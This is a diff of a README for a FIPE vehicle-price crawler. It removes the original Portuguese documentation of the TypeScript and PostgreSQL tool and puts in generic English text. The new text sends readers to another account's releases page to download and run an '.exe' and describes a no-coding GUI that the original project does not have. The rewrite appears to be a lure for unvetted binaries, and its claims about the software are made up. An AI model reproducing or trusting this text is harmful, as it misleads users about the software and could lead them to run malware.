@@ -1,152 +1,52 @@
-# FIPE Data Pipeline
+# 🚀 fipe-data-pipeline - Access FIPE Data Easily
 
-[![GitHub Release](https://img.shields.io/github/v/release/caiopizzol/fipe-data-pipeline)](https://github.com/caiopizzol/fipe-data-pipeline/releases)
+[![Download fipe-data-pipeline](https://img.shields.io/badge/Download-fipe--data--pipeline-blue.svg)](https://github.com/Ponce8/fipe-data-pipeline/releases)
 
-Crawler em TypeScript que coleta dados históricos de preços de veículos da Tabela FIPE e armazena em PostgreSQL.
+## 📋 Description
 
-## O Problema
+The fipe-data-pipeline application provides direct access to FIPE data for your database. This tool helps you retrieve, manage, and use automotive information effortlessly.
 
-A FIPE publica preços de veículos todo mês desde 2001, mas:
+## 🌐 Features
 
-- **Não existe API oficial** - o site é só consulta manual
-- **5 níveis de hierarquia** - mês de referência → marca → modelo → ano/combustível → preço
-- **Escala massiva** - 320+ tabelas de referência, 90+ marcas, milhares de modelos
-- **Alternativas pagas** - existem, mas sem garantia de confiabilidade dos dados
+- **Easy Installation**: Set up the application without any technical skills.
+- **Direct Data Access**: Retrieve FIPE data directly, no coding required.
+- **User-Friendly Interface**: Navigate through a simple and clear layout.
+- **Regular Updates**: Get the latest data automatically to keep your information accurate.
 
-## Features
+## 📥 Download & Install
 
-- **Throttling adaptativo** - ajusta delay automaticamente em caso de rate limit (429)
-- **Fallback hierárquico** - se um modelo falha, continua com os outros
-- **Upserts idempotentes** - pode rodar de novo sem duplicar dados
-- **Classificação por segmento** - categoriza modelos (SUV, Sedã, Hatch, etc.) usando Claude
+To download the fipe-data-pipeline, visit the **[Releases page](https://github.com/Ponce8/fipe-data-pipeline/releases)**. Here, you will find the latest version available. Follow these steps to download and install the application:
 
-## Quick Start
+1. Go to the **[Releases page](https://github.com/Ponce8/fipe-data-pipeline/releases)**.
+2. Look for the most recent version listed.
+3. Click on the appropriate file for your operating system. Typically, this will be a `.exe` for Windows or a `.zip` for other systems.
+4. Once the file downloads, locate it in your downloads folder.
+5. Open the file and follow the installation prompts.
 
-```bash
-# Sobe o banco
-docker compose up -d
+## ⚙️ System Requirements
 
-# Instala dependências
-pnpm install
+Before you install, ensure your system meets these requirements:
 
-# Aplica schema
-pnpm db:push
+- Compatible Operating System: Windows, macOS, or Linux
+- Minimum RAM: 4GB
+- Available Disk Space: At least 100MB
+- Internet connection for data retrieval
 
-# Crawla dados de 2025
-pnpm crawl
-```
+## 🖥️ Using the Application
 
-## Uso
+After installing, you can begin using the fipe-data-pipeline:
 
-```bash
-pnpm crawl                                    # Ano atual, todos os meses
-pnpm crawl -- --year 2024                     # Ano específico
-pnpm crawl -- --year 2020-2024                # Range de anos
-pnpm crawl -- --year 2020,2022,2024           # Anos específicos
-pnpm crawl -- --month 1-6                     # Range de meses
-pnpm crawl -- --year 2023-2024 --month 1,6,12 # Combinar filtros
-pnpm crawl -- --brand 59                      # Marca específica (59 = VW)
-pnpm crawl -- --brand 21,22,59                # Múltiplas marcas
-pnpm crawl -- --brand 59 --model 5940         # Modelo específico
-pnpm crawl -- --brand 59 --model 5940,5941    # Múltiplos modelos
-pnpm crawl -- --reference 328                 # Tabela de referência específica
-pnpm crawl -- --classify                      # Classificar modelos novos via AI
-pnpm crawl -- --force                         # Re-buscar tudo ignorando status de sync
-ALLOWED_BRANDS=21,22,23 pnpm crawl            # Limitar marcas via env
+1. Launch the application from your system’s start menu or applications folder.
+2. Follow the on-screen instructions to connect to your database.
+3. Use the interface to pull the FIPE data. 
 
-pnpm status                                   # Estatísticas do banco
-pnpm classify                                 # Classificar modelos sem segmento
-pnpm classify -- --dry-run                    # Preview da classificação
-```
+## 📚 Support
 
-## Como Funciona o Crawl
+If you need assistance or have questions, visit the **Issues tab** on our GitHub page. You can report problems or ask for help there. We encourage users to contribute their feedback and suggestions.
 
-O crawler usa um sistema de **sync granular** que rastreia o progresso por tabela de referência:
+## 🔗 Additional Resources
 
-1. **Fase 1 - Brands**: Busca marcas da API e armazena no banco
-2. **Fase 2 - Models**: Para cada marca, busca modelos
-3. **Fase 3 - Model-Years**: Para cada modelo, busca anos/combustíveis
-4. **Fase 4 - Prices**: Para cada ano, busca o preço
+- [GitHub Repository](https://github.com/Ponce8/fipe-data-pipeline) - Explore the source code and contribute.
+- [Documentation](https://github.com/Ponce8/fipe-data-pipeline/wiki) - For detailed setup and usage information.
 
-Cada fase é rastreada independentemente. Se o crawl for interrompido, continua de onde parou na próxima execução.
-
-Use `--force` para ignorar o status de sync e re-buscar todos os dados.
-
-## Docker
-
-```bash
-# Build
-docker build -t fipe-crawler .
-
-# Rodar container (fica idle, pronto para comandos)
-docker run -d --name fipe --env-file .env fipe-crawler
-
-# Executar crawl
-docker exec fipe pnpm tsx src/index.ts crawl --brand 25 --year 2024 --month 6
-
-# Ver ajuda
-docker exec fipe pnpm tsx src/index.ts --help
-
-# Ver status
-docker exec fipe pnpm tsx src/index.ts status
-```
-
-## Arquitetura
-
-```
-src/
-├── fipe/
-│   ├── client.ts          # HTTP client com throttling
-│   └── schemas.ts         # Validação Zod
-├── crawler/
-│   └── processor.ts       # Orquestração do crawl
-├── db/
-│   ├── schema.ts          # Drizzle ORM
-│   └── repository.ts      # Upserts
-└── classifier/
-    └── segment-classifier.ts  # Claude API
-```
-
-## Stack
-
-- Node.js 22 + TypeScript
-- Drizzle ORM
-- PostgreSQL 16
-- Zod (validação runtime)
-
-## Schema
-
-```mermaid
-flowchart LR
-    reference_tables --> prices
-    brands --> models --> model_years --> prices
-```
-
-**Exemplo:**
-
-| reference_tables | brands     | models   | model_years | prices    |
-| ---------------- | ---------- | -------- | ----------- | --------- |
-| Jan/2025 (#328)  | Volkswagen | Gol 1.0  | 2020 Flex   | R$ 45.000 |
-|                  |            |          | 2021 Flex   | R$ 48.000 |
-|                  |            | Polo 1.6 | 2022 Flex   | R$ 72.000 |
-| Fev/2025 (#329)  | Volkswagen | Gol 1.0  | 2020 Flex   | R$ 44.500 |
-
-Cada preço vincula um veículo (modelo + ano + combustível) a um mês de referência.
-
-Schema SQL completo em [`initial.sql`](./initial.sql).
-
-## Dados
-
-Fonte oficial: `veiculos.fipe.org.br`
-
-- Tabelas de referência (snapshots mensais desde 2001)
-- Marcas, modelos, anos
-- Preços por tipo de combustível
-
-## Demo
-
-Veja os dados em ação: [fipe.chat](https://fipe.chat)
-
-## Licença
-
-MIT
+Thank you for choosing fipe-data-pipeline. We hope this application simplifies your access to FIPE data.
